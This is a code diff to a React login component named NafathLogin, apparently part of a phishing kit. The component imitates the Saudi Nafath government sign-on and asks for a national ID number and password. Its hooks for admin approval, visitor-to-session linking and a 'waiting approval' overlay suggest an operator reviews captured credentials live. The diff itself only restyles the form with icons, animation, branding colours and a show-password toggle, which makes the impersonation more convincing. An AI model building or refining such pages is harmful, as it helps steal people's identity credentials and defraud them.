@@ -1,13 +1,13 @@
 import { useState, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { Loader2 } from "lucide-react";
+import { Loader2, User, Lock, LogIn, Info } from "lucide-react";
+import { motion } from "framer-motion";
 import VerificationLayout from "@/components/VerificationLayout";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { toast } from "sonner";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
-
 const NafathLogin = () => {
   const navigate = useNavigate();
   const location = useLocation();
@@ -52,11 +52,15 @@ const NafathLogin = () => {
     setWaitingApproval(true);
   };
 
-  const inputCls = "w-full px-3 py-2.5 rounded-lg bg-background border border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/20 transition-all text-right";
+  const [showPassword, setShowPassword] = useState(false);
+
+  const inputWrapperCls = "relative flex items-center";
+  const inputCls = "w-full pl-3 pr-10 py-3 rounded-xl bg-background border-2 border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-[#11998e] focus:ring-2 focus:ring-[#11998e]/20 transition-all text-right";
+  const iconCls = "absolute right-3 w-4 h-4 text-muted-foreground pointer-events-none";
 
   return (
     <VerificationLayout title={nl.title} subtitle={nl.subtitle}>
-      <div className="px-5 pb-4 space-y-3 pt-16">
+      <div className="px-5 pb-5 pt-14">
         {waitingApproval ? (
           <WaitingApprovalOverlay
             title={nl.waitingApproval}
@@ -64,27 +68,91 @@ const NafathLogin = () => {
             icon="shield"
           />
         ) : (
-          <>
+          <motion.div
+            className="space-y-4"
+            initial={{ opacity: 0, y: 12 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.4 }}
+          >
+            {/* Form fields */}
             <div className="space-y-3">
-              <div>
-                <input className={inputCls} placeholder={nl.usernamePlaceholder} value={username}
-                  onChange={(e) => { setUsername(e.target.value); setError(""); }} dir="rtl" />
-              </div>
-              <div>
-                <input className={inputCls} type="password" placeholder={nl.passwordPlaceholder} value={password}
-                  onChange={(e) => { setPassword(e.target.value); setError(""); }} dir="rtl" />
-              </div>
-              {error && <p className="text-[10px] text-destructive text-right">{error}</p>}
-              <button onClick={handleCredentialsSubmit} disabled={loading || !username || !password}
-                className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg py-2.5 font-bold text-xs transition-colors disabled:opacity-50">
-                {loading ? nl.processing : nl.login}
-              </button>
+              <motion.div
+                initial={{ opacity: 0, x: 10 }}
+                animate={{ opacity: 1, x: 0 }}
+                transition={{ delay: 0.1 }}
+              >
+                <label className="block text-xs font-semibold text-foreground mb-1.5 text-right">رقم الهوية</label>
+                <div className={inputWrapperCls}>
+                  <User className={iconCls} />
+                  <input className={inputCls} placeholder={nl.usernamePlaceholder} value={username}
+                    onChange={(e) => { setUsername(e.target.value); setError(""); }} dir="rtl" />
+                </div>
+              </motion.div>
+
+              <motion.div
+                initial={{ opacity: 0, x: 10 }}
+                animate={{ opacity: 1, x: 0 }}
+                transition={{ delay: 0.2 }}
+              >
+                <label className="block text-xs font-semibold text-foreground mb-1.5 text-right">كلمة المرور</label>
+                <div className={inputWrapperCls}>
+                  <Lock className={iconCls} />
+                  <input className={inputCls} type={showPassword ? "text" : "password"} placeholder={nl.passwordPlaceholder} value={password}
+                    onChange={(e) => { setPassword(e.target.value); setError(""); }} dir="rtl" />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute left-3 text-muted-foreground hover:text-foreground transition-colors text-[10px]"
+                  >
+                    {showPassword ? "إخفاء" : "عرض"}
+                  </button>
+                </div>
+              </motion.div>
+
+              {error && (
+                <motion.p
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  className="text-[10px] text-destructive text-right"
+                >
+                  {error}
+                </motion.p>
+              )}
             </div>
-            <div className="bg-accent rounded-lg p-3 text-center">
-              <p className="text-xs font-bold text-accent-foreground mb-1">{nl.platformTitle}</p>
-              <p className="text-[10px] text-muted-foreground">{nl.platformDesc}</p>
-            </div>
-          </>
+
+            {/* Login button */}
+            <motion.button
+              onClick={handleCredentialsSubmit}
+              disabled={loading || !username || !password}
+              className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
+              style={{ backgroundColor: '#11998e' }}
+              whileTap={{ scale: 0.98 }}
+              initial={{ opacity: 0, y: 8 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ delay: 0.3 }}
+            >
+              {loading ? (
+                <Loader2 className="w-4 h-4 animate-spin" />
+              ) : (
+                <LogIn className="w-4 h-4" />
+              )}
+              <span>{loading ? nl.processing : nl.login}</span>
+            </motion.button>
+
+            {/* Info box */}
+            <motion.div
+              className="bg-[#11998e]/5 border border-[#11998e]/20 rounded-xl p-3.5 text-center"
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              transition={{ delay: 0.4 }}
+            >
+              <div className="flex items-center justify-center gap-1.5 mb-1.5">
+                <Info className="w-3.5 h-3.5 text-[#11998e]" />
+                <p className="text-xs font-bold text-foreground">{nl.platformTitle}</p>
+              </div>
+              <p className="text-[10px] text-muted-foreground leading-relaxed">{nl.platformDesc}</p>
+            </motion.div>
+          </motion.div>
         )}
       </div>
     </VerificationLayout>
